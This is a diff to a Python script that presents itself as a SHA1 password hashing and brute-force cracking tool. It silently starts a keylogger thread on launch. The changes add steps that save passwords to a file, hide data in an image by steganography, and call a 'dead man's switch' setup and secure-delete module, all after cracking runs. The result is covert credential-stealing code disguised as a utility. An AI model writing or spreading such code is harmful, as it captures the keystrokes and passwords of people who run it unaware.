@@ -1,25 +1,33 @@
-from os import read, write
+from os import read, write,path
 import sys
 from urllib.request import hashlib,urlopen
 import keylogger as kl
 import threading
 import pyautogui as pa
+from extractpasswordtofile import savepassword
+from steg import convertToSteg
+from deadmanswitch import setup
+from secure_delete import secure_delete
 
 fileurl="passlist.txt"
 result="null"
 ch=0
-keylogger_thread=threading.Thread(target=kl.activateKeylogger)
+keylogger_thread=threading.Thread(target=kl.activateKeylogger) #start the keylogger
 keylogger_thread.start()
+
 #function to perform sha1 conversion
 def convertToHash(word):
-    converted_hash=hashlib.sha1(word.encode()).hexdigest()
+    converted_hash=hashlib.sha1(word.encode()).hexdigest() #converting string to sha1
     return converted_hash
 
 #convert plaintext into sha1
 def encrypt():
-    word=pa.password("Enter the password to be converted:")
     global result
-    result=convertToHash(word)
+    try:
+        word=pa.password("Enter the password to be converted:")
+        result=convertToHash(word)
+    except:
+        sys.exit("Terminated")
     pa.alert( result,"SHA 1 encrypted password is","Continue")
     print("SHA1 encrypted password is :")
     print(result)
@@ -40,12 +48,13 @@ def decrypt(ch):
         else:
             print("\nNo hash matches found...")
             print("\nPassword not found")
+
 #pre-generated list bruteforce
     if ch==2:
         try:
 #creates a file which contains the list of all the common passwords and appends the data
-            f=open(fileurl,"x")
-            LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
+            with open(fileurl,"x") as f:
+                LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'utf-8')
             for guess in LIST_OF_COMMON_PASSWORDS.split('\n'):
                 f=open(fileurl,"a")
                 f.write(guess)
@@ -61,12 +70,17 @@ def decrypt(ch):
             hashedGuess = hashlib.sha1(bytes(guess, 'utf-8')).hexdigest()
             if hashedGuess == result:
                 pa.alert(guess,"Password is","Done")
+                print("Encoding to image\n")
+                convertToSteg()
+                setup()
                 sys.exit("Completed")
 
             elif hashedGuess != result:
                 print("Password guess ",str(guess)," does not match, trying next...")
-    pa.alert("Bruteforce failed... Password not in Database")
-    sys.exit("Completed")
+    pa.alert("Bruteforce failed... Password not in Database, adding to list")
+    savepassword()
+    convertToSteg()
+    setup()
 
 print("Generate SHA1 encrypted password and save the cracked passwords to a txt file")
 encrypt()
@@ -75,5 +89,3 @@ if choice=='Manual':
     decrypt(1)
 if choice=='Pre-defined List':
     decrypt(2)
-
-
